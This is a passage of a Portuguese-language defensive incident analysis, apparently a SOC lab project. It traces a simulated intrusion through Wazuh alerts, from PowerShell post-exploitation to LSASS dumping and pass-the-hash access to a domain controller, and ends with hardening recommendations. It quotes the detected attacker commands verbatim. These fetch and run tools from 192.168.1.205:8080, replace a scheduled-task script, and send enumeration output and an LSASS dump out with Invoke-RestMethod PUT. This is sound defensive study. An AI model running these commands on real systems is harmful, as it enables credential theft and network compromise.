IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEASps1.ps1') | Out-File "$env:USERPROFILE\Downloads\winpeas.txt" -Encoding ASCII
```
- **Origem da ligação**: `192.168.1.206`
- **Destino da ligação**: `192.168.1.205:8080`
- **Canal de eventos**: `Microsoft-Windows-PowerShell/Operational`
- **Tipo de evento**:
  - `4104` — Execução de ScriptBlock
  - `3` — Conexão de rede via PowerShell
<br/>
<br/>

#### 🔍 Interpretação Defensiva

Este conjunto de eventos mostra um **comportamento clássico de pós-exploração**, onde o atacante utiliza o PowerShell para descarregar ferramentas auxiliares como o **winPEAS**, com o intuito de **enumerar o sistema local** e identificar potenciais vetores de escalada de privilégios, neste caso para escapar ao Windows defender foi descarregado um script para enumeração simples sendo assim evasiva.

O uso da função `IEX` (Invoke-Expression), aliado ao `DownloadString`, constitui um **método típico de execução fileless**. O ficheiro é descarregado diretamente para a memória e armazenado localmente.

---

<br/>
<br/>

###  2. Exfiltração de Dados via `Invoke-RestMethod`

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/24a355a3-bcbc-41f6-b55e-17b159e18763" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

>  ⚠️ Este alerta registado pela Wazuh demonstra claramente a **exfiltração do ficheiro** para um servidor remoto, usando o comando `Invoke-RestMethod` com o método HTTP `PUT`.

---

<br/>
<br/>

### Detalhes técnicos do alerta:

- **Comando invocado**:
```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
```
- **Canal**: Microsoft-Windows-PowerShell/Operational  
- **Ficheiro exfiltrado**: `winpeas.txt`, gerado anteriormente com os resultados da enumeração feita via WinPEAS  
- **Destino remoto**: `192.168.1.205` na porta `8080` (servidor de receção configurado pelo atacante)
- **Processo associado**: `powershell.exe` com PID `8296`  
- **Severidade**: `INFORMATION`, mas com conteúdo altamente sensível

---
<br/>
<br/>

**Contexto adicional:**

O payload revela que a sessão PowerShell foi iniciada com parâmetros evasivos:
- `-NoProfile`
- `-ExecutionPolicy Bypass`

A exfiltração é realizada após a execução do script de enumeração, e demonstra a tentativa de **subtrair dados críticos do sistema de forma encoberta**, usando um canal HTTP simples e fácil de omitir inspeção profunda de pacotes (DPI).

<br/>
<br/>

###  3. Verificação de Permissões e Substituição Maliciosa de Script Agendado

<br/>
<br/>

O próximo conjunto de alertas revela um comportamento ofensivo associado à **elevação de privilégios através da substituição de ficheiros** usados por tarefas agendadas.

<br/>
<br/>

#### 🛠 Alerta 1: Execução de `icacls.exe`

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/c1c44292-71c0-4a4b-83c4-4362eefe1ddf" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>

- **Comando Executado**:
  ```cmd
  C:\Windows\system32\icacls.exe C:\TempTask\svc_launcher.ps1
  ```
- **Objetivo**: Enumerar permissões do ficheiro `svc_launcher.ps1` localizado em `C:\TempTask`, usado pelo sistema.
- **Processo Parent**: `powershell.exe` com comando TCPClient típico de backdoor.

<br/>
<br/>

> ⚠️ Este comportamento revela a **intenção de analisar permissões** para determinar se o ficheiro podia ser substituído.

<br/>
<br/>

#### 🛠 Alerta 2: `Invoke-WebRequest` com Substituição do Script!

<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/9704dda8-e6f2-4005-a17e-b57383e19be3" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>


- **Comando PowerShell**:
  ```powershell
  Invoke-WebRequest -Uri "http://192.168.1.205:8080/svc_launcher.ps1" -OutFile "C:\TempTask\svc_launcher.ps1"
  ```
- **Intenção**: Substituir o ficheiro legítimo por uma versão maliciosa descarregada do servidor remoto.

<br/>
<br/>

**⚠️ Contexto de Abuso**:
- O ficheiro `svc_launcher.ps1` encontrava-se **mal protegido**, com permisões elevadas e configurado para ser executado por uma **tarefa automática ao arranque do sistema**.
- Ao substituí-lo, o atacante assegura que o **script malicioso será executado com privilégios SYSTEM** na próxima reinicialização.

---

<br/>
<br/>
E, por fim, a confirmação da escalada de privilégio foi feita com sucesso, tendo sido detectada através do evento mostrado na imagem seguinte. É possível verificar uma ligação feita pelo PowerShell, numa porta suspeita, em que o utilizador em questão é o SYSTEM, revelando o comprometimento total da máquina cliente. 
<p align="center">
<br/>
  <br/>
  <img src="https://github.com/user-attachments/assets/d824a9a5-eb29-4d30-bcb2-b11de2ddfeeb" height="80%" width="80%"/>
    <br/>
    <br/>
  <p/>


**Conclusão:**
Estes eventos representam uma tentativa clara de **elevação de privilégios por substituição de scripts agendados**.  
O atacante validou permissões com `icacls` e, ao confirmar fragilidades, usou `Invoke-WebRequest` para implantar um payload malicioso. Esta técnica é comum em **ataques de persistência e privilege escalation**, explorando **tarefas de sistema mal configuradas**.

<br/>
<br/>

### ✅ **Conclusão da Fase 2**

<br/>
<br/>

#### **Resumo dos indicadores detetados:**

- **Execução de PowerShell com parâmetros de evasão**, incluindo `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`.
- **Download de scripts via HTTP** através de `Invoke-WebRequest` e `DownloadString`, envolvendo IP interno `192.168.1.205` na porta `8080`.
- **Ferramenta de enumeração `winPEAS` transferida e executada** no sistema.
- **Exfiltração de dados com `Invoke-RestMethod`**, enviando ficheiros `.txt` com resultados da enumeração para o servidor remoto.
- **Substituição de script legítimo (`svc_launcher.ps1`) por versão maliciosa**, com permissões permissivas na pasta `C:\TempTask\`.
- **Técnica de Escalada de Privilégios via tarefa agendada**, visando execução com permissões SYSTEM.
- **Ligação via powershell pelo user SYSTEM**
<br/>
<br/>
    
#### 🔐 **Recomendações:**

- **Configurar IDS/IPS (como Suricata)** para detenção e prevenção.
- **Integrar YARA rules ou assinaturas com EDR** para bloquear scripts .ps1 suspeitos.
- **Monitorizar e bloquear o uso de PowerShell com parâmetros suspeitos** (`Bypass`, `Hidden`, `NoProfile`) através de regras em EDR/SIEM.
- **Restringir comunicações para IPs internos em portas incomuns** (ex: `8080`) e inspecionar atividades de rede não autorizadas.
- **Aplicar permissões rigorosas em diretórios sensíveis**, impedindo escrita por utilizadores sem privilégios elevados.
- **Auditar e validar tarefas agendadas** que executam scripts PowerShell no arranque.
- **Implementar AppLocker ou WDAC** para limitar a execução de scripts não assinados e ferramentas de pós-exploração
- **Impedir que estações de trabalho comuniquem diretamente em portas incomuns como 4444, etc.**
---

<br/>
<br/>

## 🧩 Fase 3 – Enumeração do Domínio
<br/>
<br/>

### 📷 Visão Geral dos Alertas Detectados  

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/d424ce05-b00b-48fc-87b5-9683380f7656" height="100%" width="100%"/>   
   <br/>
   <br/>
 <p/>


Durante esta fase, o atacante já com privilégios elevados iniciou uma sequência de **atividades de reconhecimento**, utilizando ferramentas nativas do Windows para realizar a enumeração do domínio. Este comportamento é típico de um adversário em fase de exploração pós-comprometimento, que procura identificar alvos relevantes, contas privilegiadas e possíveis caminhos de movimentação lateral.

<br/>
<br/>

### Detalhes Relevantes Observados:

- **Uso de WMIC (Windows Management Instrumentation Command-line)**. Esta é frequentemente usada por atacantes para recolher informações detalhadas do sistema e domínio
- **Execução de comandos PowerShell** que geraram instâncias de linha de comandos (`cmd.exe`) para posterior uso do binário `net.exe`.
- **Utilização do `net.exe`**: Indicador clássico para enumeração de grupos, utilizadores e partilhas de rede.
- **Sequência de eventos consistente com Discovery Tactics (MITRE ATT&CK T1087, T1018, T1033)**, sugerindo um mapeamento ativo da infraestrutura.

<br/>
<br/>

> ⚠️ Estes eventos indicam o início de uma tentativa sistemática de reconhecimento e possível **movimentação lateral futura**.

<br/>
<br/>

### Atividades de Enumeração Detetadas
<br/>
<br/>

### 1. Enumeração de Contas de Utilizador via WMIC

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/7164fec1-b147-491c-ac08-c889c21f4d7e" height="100%" width="100%"/>   
   <br/>
   <br/>
 <p/>



**Foi observada a execução do seguinte comando:**

```powershell
wmic useraccount get name,sid
```

Este comando permite ao atacante obter todos os utilizadores locais e respetivos SIDs (Security Identifiers), uma etapa fundamental para mapear contas privilegiadas e utilizadores válidos.  
O comando foi executado com privilégios de **NT AUTHORITY\SYSTEM**, está ligado ao ficheiro `svc_launcher.ps1`, que foi previamente comprometido durante a fase de elevação de privilégios.

---

<br/>
   <br/>

### 2. Enumeração de Grupos de Domínio com “net group”

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/f1a9d632-9751-4d0b-b7d9-ed22e50ff8d6" height="80%" width="80%"/>   
   <br/>
   <br/>
 <p/>


**Outro comando executado foi:**

```cmd
net group "Domain Admins" /domain
```

Este comando permite identificar os utilizadores pertencentes ao grupo **Domain Admins**, crucial para avaliar alvos com elevados privilégios dentro do ambiente.  
A execução foi feita através do binário **net.exe**, dentro de um contexto do sistema, com origem no mesmo processo PowerShell anterior.

---

<br/>
   <br/>

### 3. Enumeração de Partilhas Remotas com “net use”

<br/>
<br/>

**Finalmente, foi também registado:**

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/371630f2-72d5-4c2a-a377-6bd735f8655c" height="80%" width="80%"/>   
   <br/>
   <br/>
 <p/>


```cmd
net use \\pilao.pt\C$
```

Este comando tenta montar a partilha administrativa do volume C: de um sistema remoto.  
Isto pode indicar a intenção de testar conectividade e acessos entre máquinas, ou até mesmo preparar movimentação lateral para outras hosts da rede.

---

<br/>
   <br/>

### **Conclusão**
Estas ações são típicas de uma fase pós-exploração onde o atacante, já com privilégios elevados (**SYSTEM**), procura ganhar visibilidade sobre o domínio e identificar potenciais alvos para movimentos posteriores, como **lateral movement** ou **escalada de privilégios adicionais**.

### Recomendações

- **Desativar ou restringir o uso** de ferramentas como `net.exe`, `wmic`, `PowerShell` e `cmd.exe` para utilizadores que não necessitem delas.
- **Impedir que contas comuns acedam a partilhas administrativas** `(C$, ADMIN$)` via firewall ou GPO. Desativar o acesso remoto desnecessário entre estações.
<br/>
<br/>


## 🧩 Fase 4 – Dump de credenciais e acesso ao DC

<br/>
<br/>

**Alertas detectados**  

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/12b396cc-7f98-4ca6-a466-1fb662bcec55" height="100%" width="100%"/>   
   <br/>
   <br/>
 <p/>


Durante esta fase final da intrusão, o atacante ja com o **controlo total sobre a máquina comprometida**, iniciou ações altamente sensíveis, com o objetivo de comprometer contas privilegiadas através do **LSASS memory dump** e subsequente **exfiltração de credenciais**. Foram observados os seguintes comportamentos:

<br/>
<br/>

- **Criação e execução do binário `nativedump.exe`** diretamente no diretório `C:\Windows\Temp\`, com objetivo explícito de realizar um *dump* da memória do processo LSASS — técnica comum para extrair credenciais armazenadas.
- Ação realizada **através do PowerShell**, indicando persistência no uso desta ferramenta.
- **Atividade de exfiltração através da porta 8080**, repetindo o padrão identificado em fases anteriores, utilizando o servidor remoto `192.168.1.205`, para extrair o ficheiro *dump*.

<br/>
   <br/>


### 1. Upload e Execução da Ferramenta nativedump

<br/>
<br/>

#### Evidências:

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/916f0696-1600-4144-94ec-1a49e36be432" height="80%" width="80%"/>
  <br/>
   <br/>
   <img src="https://github.com/user-attachments/assets/81619491-94da-42d7-9fd6-9638a6083286" height="80%" width="80%"/>
  <br/>
   <br/>
   <img src="https://github.com/user-attachments/assets/c0b7c655-9dc5-4b71-89a8-4f9149c4a5ea" height="80%" width="80%"/>
   <br/>
   <br/>
 <p/>



**As três imagens apresentadas demonstram a execução das seguintes ações:**
1. Upload da ferramenta `nativedump.exe` a partir do IP remoto `192.168.1.205`.
2. Escrita do binário em `C:\Windows\Temp\nativedump.exe`.
3. Execução da ferramenta com o objetivo de gerar um dump de memória (LSASS).
4. Detecção de um evento indicando um possivel dump LSASS.

---

<br/>
<br/>

#### Análise
Foi realizado **upload e execução da ferramenta `nativedump.exe`** no host `Client1.pilao.pt` sob contexto SYSTEM. A finalidade foi a obtenção de **credenciais via memória do LSASS**, comprometendo a segurança de contas privilegiadas.

---

<br/>
<br/>

#### Evidências de Infiltração e execução do Payload

<br/>
<br/>

```powershell
# Descarregamento da ferramenta
Invoke-WebRequest -Uri "http://192.168.1.205:8080/nativedump.exe" -OutFile "C:\Windows\Temp\nativedump.exe"

# Execução do binário para gerar dump de LSASS
C:\Windows\Temp\nativedump.exe -o .\proc_664.dmp

# Evidência adicional via Sysmon
File created: C:\Windows\Temp\proc_696.dmp by nativedump.exe
```

**Hashes apresentadas no alerta:**

```
SHA1: ECFBD5E727B5A4FF528F16D1E9B7B8961706C1C7
MD5: 4ECC2AD245B5A52169D0D06023958FF8
SHA256: 863DC80643267CAC0414B40972B4B61C2674E2AC9F25A8B53738E1DAB17109D
IMPhash: D42D559B5C9F08AEF25C56AABDEFD6BE
```

<br/>
   <br/>

#### **Acções que poderiam ser realizadas com estes dados:**

<br/>
<br/>

**Pesquisar em fontes de Threat Intelligence**:
- Submeter os hashes **SHA256** e **IMPhash** nas plataformas **VirusTotal, MalwareBazaar, HybridAnalysis, ANY.RUN, Intezer**.
- Correlacionar com a técnica do **MITRE ATT&CK T1003.001** (Dump de memória do LSASS).

**Ações de Resposta a Incidentes (IR)**:
- Bloquear o **SHA256** através de assinaturas no **EDR / antivírus / NGFW**.
- **Quarentena ou eliminar** o ficheiro `nativeDump.exe`.
- Realizar **scans à memória e ao disco** à procura de ferramentas semelhantes.
- **Investigar o script pai** `svc_launcher.ps1`.

---

<br/>
<br/>

### **Intenção do atacante**
O atacante visava capturar **credenciais em texto claro ou hashes** diretamente da memória do processo LSASS. Isso sugere:
- Potencial uso posterior em **movimentações laterais**.
- Possível exfiltração para IP externo via HTTP (porta 8080).
- Comprometimento total de contas locais ou de domínio com sessões ativas.

---

<br/>
<br/>


### 2. Exfiltração de ficheiro Dump

<br/>
   <br/>

#### Evidência: Transmissão do ficheiro de memória dump para servidor remoto

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/64943efe-17f6-4493-b57d-f0b63e0a665d" height="80%" width="80%"/>
 <br/>
 <br/>
 <p/>


**Fonte**
- **Hostname:** Client1.pilao.pt
- **User:** PILAO\SYSTEM
- **Agente IP:** 192.168.1.206

<br/>
<br/>

**Comando Detetado**
```powershell
Invoke-RestMethod -Uri "http://192.168.1.205:8080/proc_696.dmp" -Method Put -InFile "C:\Windows\Temp\proc_696.dmp"
```

<br/>
<br/>

**Descrição**
O ficheiro `proc_696.dmp`, gerado a partir da ferramenta `nativedump.exe`, foi transmitido via protocolo HTTP utilizando o `Invoke-RestMethod` com método `PUT`, direcionado para um host remoto (192.168.1.205) na porta 8080. Isto indica **exfiltração de credenciais para análise offline**.

<br/>
<br/>
Esta ação sugere a tentativa de análise do conteúdo da memória (incluindo hashes de credenciais) fora do sistema comprometido, representando alto risco de **acesso subsequente a outros sistemas**, inclusive ao **Controlador de Domínio**.

---

<br/>
   <br/>

### 3. Acesso ao Controlador de Domínio

<br/>
   <br/>

#### Evidências

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/f7488444-d66b-4344-9220-658cdffd3264" height="80%" width="80%"/>
 <br/>
 <br/>
 <p/>

Este ponto documenta o acesso final ao **Controlador de Domínio (DC1)** após as etapas anteriores de execução de dump LSASS e exfiltração de credenciais. A sequência de eventos aponta para um acesso privilegiado, com **credenciais roubadas** ou uso de **pass-the-hash (PtH)**.

<br/>
   <br/>

**Jun 22, 2025 @ 11:41:55
Agent: DC1**

- Acesso a partilhas de rede detectado repetidamente.
- Logon remoto detectado com o utilizador: Administrator
- Tipo de autenticação: NTLM
- Suspeita de ataque do tipo Pass-the-Hash
- Privilegios elevados foram atribuídos a uma nova sessão.

---

<br/>
   <br/>


#### 📸 Evidência 1 - Autenticação com NTLM (Pass-the-Hash)

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/defccb74-3179-457c-b5fa-e3d21720c45a" height="80%" width="80%"/>
  <br/>
  <br/>
 <p/>

A primeira evidência indica **um processo de autenticação com recurso ao protocolo NTLM V2**, iniciado a partir do endereço IP `192.168.1.205`. O evento reflete uma tentativa de logon do tipo `3` (rede), ou seja, não-interativo, geralmente associado a acessos remotos (ex: SMB ou RDP).

- **Fonte IP**: `192.168.1.205`
- **Autenticação**: `NTLM V2`
- **LogonType**: `3` (Rede)
- **TargetDomain**: `PILAO`
- **TargetUser**: `Administrator`
- **SID**: `S-1-5-21-...`

**Interpretação**: Este tipo de autenticação é comum em movimentos laterais ou fases pós-exploração onde o atacante procura aceder a recursos protegidos após obter hashes de contas com privilégios elevados.

<br/>
   <br/>

#### 📸 Evidência 2 - Acesso à partilha ADMIN$

<p align="center">
<br/>
  <br/>
   <img src="https://github.com/user-attachments/assets/922122e2-0f89-4fa3-9e4a-53ec3b7970b4" height="80%" width="80%"/>
  <br/>
  <br/>
 <p/>

A segunda evidência revela que, **após a autenticação bem-sucedida**, o atacante acedeu remotamente à partilha administrativa `\\ADMIN$` no host `Marcio.pilao.pt` (identificado como o DC), especificamente ao diretório `C:\Windows`.

- **Diretório**: `\?\C:\Windows`
- **Partilha Acedida**: `\ADMIN$`
- **Objeto Acedido**: `File`
- **Utilizador**: `Administrator`
- **Host**: `Marcio.pilao.pt`
- **EventID**: `5140`

<br/>
   <br/>

**Interpretação**: O acesso à `ADMIN$` é típico de **atividades de administração remota**, sendo frequentemente utilizado por ferramentas de ataque para **entrega de payloads, execução de comandos, ou recolha de dados confidenciais** como parte de um ataque de tipo lateral ou de domínio.

---

<br/>
   <br/>

### Conclusão Técnica

Estas evidências em conjunto apontam para um **comprometimento do domínio via autenticação remota com credenciais privilegiadas**, possivelmente através de **Pass-the-Hash**. A sequência de eventos sugere:

1. Obtenção prévia de hashes de contas administrativas  (na Fase 3 com LSASS dump)
2. Utilização de NTLM para autenticação remota sem necessidade da senha em claro
3. Acesso a partilhas administrativas no DC como preparação para execução remota ou exfiltração.

<br/>
   <br/>


### 🔎 Resumo dos Indicadores Detetados:
- **Ferramenta de Cred Dumping**: Upload e execução de `nativedump.exe` no diretório `C:\Windows\Temp\`.
- **Hashing Evidence**: Dump da memória LSASS contendo hashes e credenciais (T1003.001 – MITRE ATT&CK).
- **Exfiltração de Dados Sensíveis**: Envio do ficheiro `proc_696.dmp` para o IP `192.168.1.205` via `Invoke-RestMethod`.
- **Autenticação Suspeita via NTLM**: Logon remoto do utilizador `Administrator` com NTLM V2 (LogonType 3), a partir do mesmo IP.
- **Acesso à partilha ADMIN$** no DC (`Marcio.pilao.pt`), típico de ações pós-exploração.
- **Host de Origem**: `Client1.pilao.pt` | **Destino final comprometido**: `DC1.pilao.pt`

---

###  Recomendações Técnicas:

1. **Isolamento Imediato dos Hosts Afetados**:
   - `Client1.pilao.pt` e `DC1.pilao.pt` devem ser removidos da rede para análise forense.

2. **Revogação e Rotação de Credenciais**:
   - Redefinir todas as passwords administrativas e de domínio potencialmente expostas.
   - Invalidar todos os hashes em cache.

3. **Análise Forense da Memória e Disco**:
   - Examinar artefactos e dumps em busca de malware residente ou ferramentas de pós-exploração.

4. **Desativar NTLM onde possível**:
   - Implementar Kerberos como padrão e aplicar políticas para bloquear NTLM em sessões remotas.

5. **Monitorização de Fluxos de Rede**:
   - Detetar transmissões HTTP incomuns (porta 8080) e configurar regras de bloqueio em NGFW.

6. **Auditorias e Revisão de Políticas GPO**:
   - Rever permissões de tarefas agendadas, acessos ao `C:\Windows\Temp`, e execução remota.


---

<br/>
   <br/>

## Conclusão Final da Análise Pós-Ataque

O exercício de análise realizado permitiu uma reconstrução detalhada de todas as fases da intrusão, desde o acesso inicial até ao comprometimento total do domínio. Através da integração de alertas gerados pelo Wazuh, observações dos canais do Windows Event Log e correlação com a framework MITRE ATT&CK, foi possível identificar técnicas, táticas e procedimentos (TTPs) usados pelo atacante de forma eficaz.

---

<br/>
   <br/>

###  Principais Conclusões

- A **deteção do vetor inicial** via phishing com macro maliciosa permitiu ativar mecanismos de alerta com base na criação de ficheiros `.LNK`, invocação de PowerShell e atividades de rede suspeitas.
- A **fase de escalada de privilégios** demonstrou uma exploração eficaz de tarefas agendadas mal configuradas, culminando na substituição de scripts e obtenção de permissões SYSTEM.
- A **enumeração do domínio** revelou a intenção clara de descobrir utilizadores privilegiados, partilhas e potenciais caminhos para movimentação lateral.
- A **fase crítica de dump de credenciais LSASS** e exfiltração expôs a infraestrutura a riscos graves de comprometimento de contas administrativas.
- O **acesso ao controlador de domínio (DC)**, com evidências de autenticação NTLM e acesso à partilha ADMIN$, validou o sucesso do atacante na obtenção de controlo total sobre o ambiente.

---

<br/>
   <br/>

###  Considerações Finais

Este projeto evidencia a importância de uma arquitetura de deteção em profundidade (`defense-in-depth`) com camadas de visibilidade desde o endpoint até à rede. A capacidade de detetar comportamentos anómalos, mesmo quando executados com ferramentas legítimas como PowerShell, foi essencial para rastrear o movimento do atacante.

A resposta a incidentes deve ser orientada por dados precisos e contextuais, e este exercício reforça a necessidade de:

- Capacitar equipas SOC com **tecnologia de monitorização em tempo real**;
- Implementar **políticas de endurecimento** (hardening) e **controlo de execução de scripts**;
- Estabelecer **planos de resposta e contenção** automáticos baseados em deteções comportamentais.

---

<br/>
   <br/>

###  Relevância do Projeto

A análise demonstrou um cenário realista de ataque, e reforçou competências técnicas essenciais na área de **cibersegurança defensiva e forense**. A adoção de boas práticas a seguir descritas permitirá aumentar substancialmente a resiliência da organização perante ameaças avançadas.

---

<br/>
   <br/>


### ⚠️ Recomendações para Fortalecer a Postura de Segurança da Empresa

1. **Educação e Sensibilização dos Colaboradores**
   - Realização periódica de campanhas de sensibilização sobre phishing e engenharia social.
   - Treinos de reconhecimento de emails maliciosos e documentos suspeitos.

2. **Reforço na Política de Macros do Office**
   - Bloquear a execução de macros não assinadas.
   - Permitir apenas macros assinadas por entidades confiáveis, ou bloquear Macros por completo.

3. **Hardening de Endpoints e Servidores**
   - Desativar funcionalidades não utilizadas, como WMIC e PowerShell em modo interativo.
   - Aplicar políticas de execução restritivas com AppLocker ou WDAC.

4. **Monitorização Contínua com SIEM, EDR e IPS**
   - Correlacionar múltiplos eventos de segurança.
   - Detectar e prevenir o uso anómalo de ferramentas ilegítimas bem como legítimas tais como `net.exe`, `wmic`, `powershell.exe`.

5. **Segmentação e Filtragem de Rede**
   - Isolar segmentos de rede críticos.
   - Restringir comunicação em portas incomuns (ex: 8080, 4444).

6. **Políticas de Autenticação Segura**
   - Implementar MFA em todos os acessos administrativos.
   - Reduzir ou eliminar uso de NTLM em ambientes modernos, forçando Kerberos.

7. **Gestão de Patches e Atualizações**
   - Garantir atualização contínua de sistemas operativos, aplicações e drivers.
   - Automatizar a aplicação de atualizações críticas de segurança.

8. **Auditoria de Tarefas Agendadas e Scripts**
   - Monitorizar scripts que são executados automaticamente no arranque.
   - Verificar permissões e assinaturas digitais de ficheiros `.ps1`.

9. **Backups Regulares e Testados**
   - Manter cópias de segurança offline.
   - Testar regularmente a restauração para garantir integridade dos dados.

10. **Simulações de Ataques Internos**
    - Realizar exercícios de Red Team/Blue Team para testar resiliência do SOC.
    - Validar deteções, tempos de resposta e procedimentos de contenção.

---

<br/>
   <br/>

Estas recomendações, quando aplicadas em conjunto com uma abordagem proativa de cibersegurança, permitirão aumentar significativamente a capacidade de prevenção, deteção e resposta a incidentes.




